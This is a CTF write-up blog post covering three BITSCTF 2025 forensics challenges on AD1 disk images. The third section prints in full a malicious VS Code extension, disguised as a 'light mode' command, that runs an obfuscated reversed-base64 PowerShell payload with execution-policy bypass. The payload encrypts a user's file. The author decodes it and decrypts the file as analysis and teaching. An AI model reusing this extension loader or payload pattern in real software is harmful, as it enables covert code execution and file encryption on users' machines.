@@ -1,0 +1,378 @@
+---
+title: "BITSCTF 2025: All DFIR challenges (3/3)"
+date: 2025-02-14T08:57:16.633Z
+draft: false
+author: madarame
+tags: [dfir]
+---
+
+import css from "css/styles.css?url";
+import image from "./image.png?url";
+import flag_decrypted from "./flag_decrypted.png?url";
+
+<link rel="stylesheet" href={css}></link>
+<link
+  rel="stylesheet"
+  href="https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/katex.min.css"
+  integrity="sha384-zh0CIslj+VczCZtlzBcjt5ppRcsAmDnRem7ESsYwWwg3m/OaJ2l4x7YBZl9Kxxib"
+  crossOrigin="anonymous"
+></link>
+<script
+  defer
+  src="https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/katex.min.js"
+  integrity="sha384-Rma6DA2IPUwhNxmrB/7S3Tno0YY7sFu9WSYMCuulLhIqYSGZ2gKCJWIqhBWqMQfh"
+  crossOrigin="anonymous"
+></script>
+<script
+  defer
+  src="https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/contrib/auto-render.min.js"
+  integrity="sha384-hCXGrW6PitJEwbkoStFjeJxv+fSOOQKOPbJxSfM6G5sWZjAyWhXiTIIAmQqnlLlh"
+  crossOrigin="anonymous"
+  onLoad="renderMathInElement(document.body);"
+></script>
+
+### Challenge #1: Baby DFIR
+
+We were given this file.
+
+> <a href="./abc.ad1" download>
+>   abc.ad1
+> </a>
+
+### Solution
+
+Initially, when I ran strings on `abc.ad1`, I got a lot of interesting strings, including `flag.txt`.
+
+```bash
+$ strings abc.ad1
+```
+
+```
+ADSEGMENTEDFILE
+ADLOGICALIMAGE
+C:\Users\vboxuser\Desktop
+C:\Users\vboxuser\Desktop]
+desktop.ini
+&-QL
+w^L_W
+20250206T225205.079274
+20250206T222016.621066B
+20250206T222016.621066[
+falset
+false
+true
+true
+true
+false
+true!
+9e36cc3537ee9ee1e3b10fa4e761045b
+7726f55012e1e26cc762c9982e7c6c54ca7bb303
+flag.txt
+20250206T225151.348146k
+20250206T225125.094082
+20250206T225151.158078
+false
+false
+true
+false
+false*
+falseB
+truev
+3677fb16caa7ba1e220668079cf26838
+035037471f31c918556e266b9bfc1bbd4c026ce5ATTRGUID
+5Lv!G
+d:~O
+e.*`^
+ZMq@
+@'#$L
+LOCSGUID
+```
+
+We can see that `flag.txt` is among the strings. Let's extract it using binwalk.
+
+```bash
+$ binwalk -e --run-as=root abc.ad1 && cat _abc.ad1.extracted/* | grep -a "BITSCTF"
+```
+
+After extracting the file, we can easily find the flag.
+
+```
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+35            0x23            LZMA compressed data, properties: 0x5D, dictionary size: 0 bytes, uncompressed size: 512 bytes
+765           0x2FD           Zlib compressed data, default compression
+1461          0x5B5           Zlib compressed data, default compression
+...
+BITSCTF{a_really_simple_intro_to_DFIR_12848a9e}
+...
+```
+
+Flag: `BITSCTF{a_really_simple_intro_to_DFIR_12848a9e}`
+
+---
+
+### Challenge #2: ViruS Camp 1
+
+We were given this file.
+
+> dimp.ad1
+
+### Solution
+
+When I ran strings on `dimp.ad1`, I got a bunch of strings and it's a very large file, so I would guess the solution is not intended to be solved by strings or any simple method.
+I decided to use `FTK Imager`, a really good tool for Disk Image Forensics, to open the file.
+Since the challenge's name is "ViruS Camp" with intentionally uppercase characters that spelled `VSC`, I thought it might be a good idea to check out the folder `.vscode` first.
+Digging around a little bit, I found this string
+
+<img src={image} alt="image" style={{ maxWidth: "100%", height: "auto" }} />
+
+Decode the string with base64 and we get the flag.
+
+```bash
+$ echo "VGhlIDFzdCBmbGFnIGlzOiBCSVRTQ1RGe0gwd19jNG5fdlNfYzBkM19sM3RfeTB1X3B1Ymwxc2hfbTRsMWNpb3VzX2V4NzNuc2kwbnNfU09fZWFzaWx5Pz9fNWE3YjMzNmN9" | base64 -d
+```
+
+```
+The 1st flag is: BITSCTF{H0w_c4n_vS_c0d3_l3t_y0u_publ1sh_m4l1cious_ex73nsi0ns_SO_easily??_5a7b336c}
+```
+
+Flag: `BITSCTF{H0w_c4n_vS_c0d3_l3t_y0u_publ1sh_m4l1cious_ex73nsi0ns_SO_easily??_5a7b336c}`
+
+---
+
+### Challenge #3: ViruS Camp 2
+
+We were given this file (the same file as in the previous challenge).
+
+> dimp.ad1
+
+### Solution
+
+My only guess is that the flag can be retrieved by deofuscating the file where I found the flag in the previous challenge.
+
+```javascript
+"use strict";
+var __createBinding =
+  (this && this.__createBinding) ||
+  (Object.create
+    ? function (o, m, k, k2) {
+        if (k2 === undefined) k2 = k;
+        var desc = Object.getOwnPropertyDescriptor(m, k);
+        if (
+          !desc ||
+          ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)
+        ) {
+          desc = {
+            enumerable: true,
+            get: function () {
+              return m[k];
+            },
+          };
+        }
+        Object.defineProperty(o, k2, desc);
+      }
+    : function (o, m, k, k2) {
+        if (k2 === undefined) k2 = k;
+        o[k2] = m[k];
+      });
+var __setModuleDefault =
+  (this && this.__setModuleDefault) ||
+  (Object.create
+    ? function (o, v) {
+        Object.defineProperty(o, "default", { enumerable: true, value: v });
+      }
+    : function (o, v) {
+        o["default"] = v;
+      });
+var __importStar =
+  (this && this.__importStar) ||
+  (function () {
+    var ownKeys = function (o) {
+      ownKeys =
+        Object.getOwnPropertyNames ||
+        function (o) {
+          var ar = [];
+          for (var k in o)
+            if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
+          return ar;
+        };
+      return ownKeys(o);
+    };
+    return function (mod) {
+      if (mod && mod.__esModule) return mod;
+      var result = {};
+      if (mod != null)
+        for (var k = ownKeys(mod), i = 0; i < k.length; i++)
+          if (k[i] !== "default") __createBinding(result, mod, k[i]);
+      __setModuleDefault(result, mod);
+      return result;
+    };
+  })();
+Object.defineProperty(exports, "__esModule", { value: true });
+exports.activate = activate;
+exports.deactivate = deactivate;
+const vscode = __importStar(require("vscode"));
+const child_process_1 = require("child_process");
+const fs = __importStar(require("fs"));
+function activate(context) {
+  const command = vscode.commands.registerCommand("rs", () => {
+    const scriptContent = `$wy7qIGPnm36HpvjrL2TMUaRbz = "K0QZjJ3bG1CIlxWaGRXdw5WakASblRXStUmdv1WZSpQDK0QKoU2cvx2Qu0WYlJHdTRXdvRiCNkCKlN3bsNkLtFWZyR3UvRHc5J3YkoQDK0QKos2YvxmQsFmbpZEazVHbG5SbhVmc0N1b0BXeyNGJK0QKoR3ZuVGTuMXZ0lnQulWYsBHJgwCMgwyclRXeC5WahxGckgSZ0lmcX5SbhVmc0N1b0BXeyNGJK0gCNkSZ0lmcXpjOdVGZv1UbhVmc0N1b0BXeyNkL5hGchJ3ZvRHc5J3QukHdpJXdjV2Uu0WZ0NXeTtFIsI3b0BXeyNmblRCIs0WYlJHdTRXdvRCKtFWZyR3UvRHc5J3QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5NFI0NWZqJ2TtcXZOBSPg0WYlJHdT9GdwlncjRiCNkSZ0FWZyNkO60VZk9WTlxWaG5yTJ5SblR3c5N1WgwSZslmR0VHc0V3bkgSbhVmc0NVZslmRu8USu0WZ0NXeTBCdjVmai9UL3VmTg0DItFWZyR3U0V3bkoQDK0QKlxWaGRXdw5WakgyclRXeCxGbBRWYlJlO60VZslmRu8USu0WZ0NXeTtFI9AyclRXeC5WahxGckoQDK0QKoI3b0BXeyNmbFVGdhVmcD5yclFGJg0DIy9Gdwlncj5WZkoQDK0wNTN0SQpjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIn5WakRWYQ5yclFGJK0wQCNkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIlR2bN5yclFGJK0gdpRCI9AiVJ5yclFGJK0QeltGJg0DI5V2SuMXZhRiCNkCKlRXYlJ3Q6oTXzVWQukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIzVWYkoQDK0gIj5WZucWYsZGXcB3b0t2clREXcJXZzVHevJmdcx1cyV2cVxFX6MkIg0DIlxWaGRXdwRXdvRiCNIyZuBnLnFGbmxFXw9GdrNXZExFXyV2c1h3biZHXcNnclNXVcxlODJCI9ASZslmR0VHculGJK0gCNkSZ6l2U2lGJoMXZ0lnQ0V2RuMXZ0lnQlZXayVGZkASPgYXakoQDpUmepNVeltGJoMXZ0lnQ0V2RuMXZ0lnQlZXayVGZkASPgkXZrRiCNkycu9Wa0FmclRXakACL0xWYzRCIsQmcvd3czFGckgyclRXeCVmdpJXZEhTO4IzYmJlL5hGchJ3ZvRHc5J3QukHdpJXdjV2Uu0WZ0NXeTBCdjVmai9UL3VmTg0DIzVGd5JUZ2lmclRGJK0gCNAiNxASPgUmepNldpRiCNACIgIzMg0DIlpXaTlXZrRiCNADMwATMg0DIz52bpRXYyVGdpRiCNkCOwgHMscDM4BDL2ADewwSNwgHMsQDM4BDLzADewwiMwgHMsEDM4BDKd11WlRXeCtFI9ACdsF2ckoQDiQmcwc3czRDU0NjcjNzU51kIg0DIkJ3b3N3chBHJ" ;
+$9U5RgiwHSYtbsoLuD3Vf6 = $wy7qIGPnm36HpvjrL2TMUaRbz.ToCharArray() ; [array]::Reverse($9U5RgiwHSYtbsoLuD3Vf6) ; -join $9U5RgiwHSYtbsoLuD3Vf6 2>&1> $null ;
+$FHG7xpKlVqaDNgu1c2Utw = [systeM.tEXT.ENCODIng]::uTf8.geTStRInG([sYsTeM.CoNVeRt]::FROMBase64StRIng("$9U5RgiwHSYtbsoLuD3Vf6")) ;
+$9ozWfHXdm8eIBYru = "InV"+"okE"+"-ex"+"prE"+"SsI"+"ON" ; new-aliaS -Name PwN -ValUe $9ozWfHXdm8eIBYru -fOrce ; pwn $FHG7xpKlVqaDNgu1c2Utw ;`;
+    const scriptPath = `C:\\Users\\vboxuser\\AppData\\Local\\Temp\\temp0001`;
+    try {
+      fs.writeFileSync(scriptPath, scriptContent);
+      vscode.window.showInformationMessage(
+        `The light mode will activate in a few minutes.`
+      );
+    } catch (error) {
+      vscode.window.showErrorMessage(`Error activating light mode.`);
+    }
+    (0, child_process_1.exec)(
+      `powershell.exe -ExecutionPolicy Bypass -File "${scriptPath}"`,
+      (error, stdout, stderr) => {
+        if (error) {
+          console.error(`Error: ${error.message}`);
+        }
+        if (stderr) {
+          console.error(`Stderr: ${stderr}`);
+        }
+        console.log(`Stdout: ${stdout}`);
+      }
+    );
+  });
+  context.subscriptions.push(command);
+}
+// VGhlIDFzdCBmbGFnIGlzOiBCSVRTQ1RGe0gwd19jNG5fdlNfYzBkM19sM3RfeTB1X3B1Ymwxc2hfbTRsMWNpb3VzX2V4NzNuc2kwbnNfU09fZWFzaWx5Pz9fNWE3YjMzNmN9
+function deactivate() {}
+//# sourceMappingURL=extension.js.map
+```
+
+I also found the file `flag.enc` in `dimp.ad1\C:\Users\vboxuser\Desktop` so I right-clicked on it and clicked "export files" to get it.
+
+This javascript code is obfuscated, but let's break it down step by step:
+
+Deobfuscation Process:
+
+1. Extracting the Base64 String
+
+`$wy7qIGPnm36HpvjrL2TMUaRbz` holds a long Base64-encoded string.
+
+2. Reversing the String
+
+`$9U5RgiwHSYtbsoLuD3Vf6 = $wy7qIGPnm36HpvjrL2TMUaRbz.ToCharArray()`
+`[array]::Reverse($9U5RgiwHSYtbsoLuD3Vf6)`
+The script reverses the Base64-encoded string before decoding.
+
+3. Decoding from Base64
+
+`$FHG7xpKlVqaDNgu1c2Utw = [systeM.tEXT.ENCODIng]::uTf8.geTStRInG([sYsTeM.CoNVeRt]::FROMBase64StRIng("$9U5RgiwHSYtbsoLuD3Vf6"))`
+Converts the reversed Base64 string back to readable text.
+
+4. Executing the Decoded Script
+
+The script creates an alias PwN for Invoke-Expression.
+`pwn $FHG7xpKlVqaDNgu1c2Utw` executes the decoded content.
+
+What This Means:
+
+This script likely downloads or executes malicious code stored in the Base64-encoded string. We can decode the Base64 string with the following python code.
+
+```python
+import base64
+
+# Extracted Base64-encoded string from the script
+encoded_string = """K0QZjJ3bG1CIlxWaGRXdw5WakASblRXStUmdv1WZSpQDK0QKoU2cvx2Qu0WYlJHdTRXdvRiCNkCKlN3bsNkLtFWZyR3UvRHc5J3YkoQDK0QKos2YvxmQsFmbpZEazVHbG5SbhVmc0N1b0BXeyNGJK0QKoR3ZuVGTuMXZ0lnQulWYsBHJgwCMgwyclRXeC5WahxGckgSZ0lmcX5SbhVmc0N1b0BXeyNGJK0gCNkSZ0lmcXpjOdVGZv1UbhVmc0N1b0BXeyNkL5hGchJ3ZvRHc5J3QukHdpJXdjV2Uu0WZ0NXeTtFIsI3b0BXeyNmblRCIs0WYlJHdTRXdvRCKtFWZyR3UvRHc5J3QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5NFI0NWZqJ2TtcXZOBSPg0WYlJHdT9GdwlncjRiCNkSZ0FWZyNkO60VZk9WTlxWaG5yTJ5SblR3c5N1WgwSZslmR0VHc0V3bkgSbhVmc0NVZslmRu8USu0WZ0NXeTBCdjVmai9UL3VmTg0DItFWZyR3U0V3bkoQDK0QKlxWaGRXdw5WakgyclRXeCxGbBRWYlJlO60VZslmRu8USu0WZ0NXeTtFI9AyclRXeC5WahxGckoQDK0QKoI3b0BXeyNmbFVGdhVmcD5yclFGJg0DIy9Gdwlncj5WZkoQDK0wNTN0SQpjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIn5WakRWYQ5yclFGJK0wQCNkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIlR2bN5yclFGJK0gdpRCI9AiVJ5yclFGJK0QeltGJg0DI5V2SuMXZhRiCNkCKlRXYlJ3Q6oTXzVWQukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIzVWYkoQDK0gIj5WZucWYsZGXcB3b0t2clREXcJXZzVHevJmdcx1cyV2cVxFX6MkIg0DIlxWaGRXdwRXdvRiCNIyZuBnLnFGbmxFXw9GdrNXZExFXyV2c1h3biZHXcNnclNXVcxlODJCI9ASZslmR0VHculGJK0gCNkSZ6l2U2lGJoMXZ0lnQ0V2RuMXZ0lnQlZXayVGZkASPgYXakoQDpUmepNVeltGJoMXZ0lnQ0V2RuMXZ0lnQlZXayVGZkASPgkXZrRiCNkycu9Wa0FmclRXakACL0xWYzRCIsQmcvd3czFGckgyclRXeCVmdpJXZEhTO4IzYmJlL5hGchJ3ZvRHc5J3QukHdpJXdjV2Uu0WZ0NXeTBCdjVmai9UL3VmTg0DIzVGd5JUZ2lmclRGJK0gCNAiNxASPgUmepNldpRiCNACIgIzMg0DIlpXaTlXZrRiCNADMwATMg0DIz52bpRXYyVGdpRiCNkCOwgHMscDM4BDL2ADewwSNwgHMsQDM4BDLzADewwiMwgHMsEDM4BDKd11WlRXeCtFI9ACdsF2ckoQDiQmcwc3czRDU0NjcjNzU51kIg0DIkJ3b3N3chBHJ"""
+
+# Reverse the string
+reversed_string = encoded_string[::-1]
+
+# Decode from Base64
+try:
+    decoded_bytes = base64.b64decode(reversed_string)
+    decoded_string = decoded_bytes.decode("utf-8", errors="ignore")
+except Exception as e:
+    decoded_string = str(e)
+
+print(decoded_string)
+```
+
+```mdx
+'$password = "MyS3cr3tP4ssw0rd"\r\n$salt = [Byte[]](0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08)\r\n$iterations = 10000\r\n$keySize = 32 \r\n$ivSize = 16 \r\n\r\n$deriveBytes = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, $iterations)\r\n$key = $deriveBytes.GetBytes($keySize)\r\n$iv = $deriveBytes.GetBytes($ivSize)\r\n\r\n$inputFile = "C:\\\\Users\\\\vboxuser\\\\Desktop\\\\flag.png"\r\n$outputFile = "C:\\\\Users\\\\vboxuser\\\\Desktop\\\\flag.enc"\r\n\r\n$aes = [System.Security.Cryptography.Aes]::Create()\r\n$aes.Key = $key\r\n$aes.IV = $iv\r\n$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC\r\n$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7\r\n\r\n$encryptor = $aes.CreateEncryptor()\r\n\r\n$plainBytes = [System.IO.File]::ReadAllBytes($inputFile)\r\n\r\n$outStream = New-Object System.IO.FileStream($outputFile, [System.IO.FileMode]::Create)\r\n$cryptoStream = New-Object System.Security.Cryptography.CryptoStream($outStream, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)\r\n\r\n$'
+```
+
+The decoded PowerShell script appears to be performing AES encryption on a file named flag.png located at:
+
+```
+C:\Users\vboxuser\Desktop\flag.png
+```
+
+What I found was that the script uses the password MyS3cr3tP4ssw0rd and a predefined salt [0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08]. It performs 10,000 PBKDF2 iterations to derive the AES key. The AES key size is 32 bytes (256-bit), and the IV size is 16 bytes. AES encryption is used for securing the data.
+It then reads the file flag.png, encrypts it, and saves it as flag.enc:
+
+```
+C:\Users\vboxuser\Desktop\flag.enc
+```
+
+We can reverse the encryption with the following python code.
+
+```python
+import hashlib
+import base64
+from Crypto.Cipher import AES
+
+# Encryption parameters
+password = "MyS3cr3tP4ssw0rd".encode()  # Convert password to bytes
+salt = bytes([0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08])  # Salt
+iterations = 10000
+key_size = 32  # 256-bit AES key
+iv_size = 16  # 16-byte IV
+input_file = "flag.enc"
+output_file = "flag_decrypted.png"
+
+# Derive key and IV using PBKDF2
+from Crypto.Protocol.KDF import PBKDF2
+
+key_iv = PBKDF2(password, salt, dkLen=key_size + iv_size, count=iterations)
+key = key_iv[:key_size]  # First 32 bytes for key
+iv = key_iv[key_size:]  # Last 16 bytes for IV
+
+# Read the encrypted file
+with open(input_file, "rb") as f:
+    encrypted_data = f.read()
+
+# Decrypt using AES-CBC
+cipher = AES.new(key, AES.MODE_CBC, iv)
+decrypted_data = cipher.decrypt(encrypted_data)
+
+# Remove PKCS7 padding
+pad_len = decrypted_data[-1]
+decrypted_data = decrypted_data[:-pad_len]
+
+# Save the decrypted file
+with open(output_file, "wb") as f:
+    f.write(decrypted_data)
+
+print(f"Decryption complete! File saved as {output_file}")
+```
+
+```
+Decryption complete! File saved as flag_decrypted.png
+```
+
+Looking at flag_decrypted.png, we can see the flag.
+
+<img
+  src={flag_decrypted}
+  alt="image"
+  style={{ maxWidth: "100%", height: "auto" }}
+/>
+
+Flag: `BITSCTF{h0pe_y0u_enj0yed_th1s_145e3f1a}`
+
+---
+
+## Final remarks
+
+Although these DFIR challenges are not really difficult, I still enjoyed solving them, especially `ViruS Camp 2` where there's a bit of `reverse engineering` involved. Thank you for reading my writeups, hope to see you in the next one!
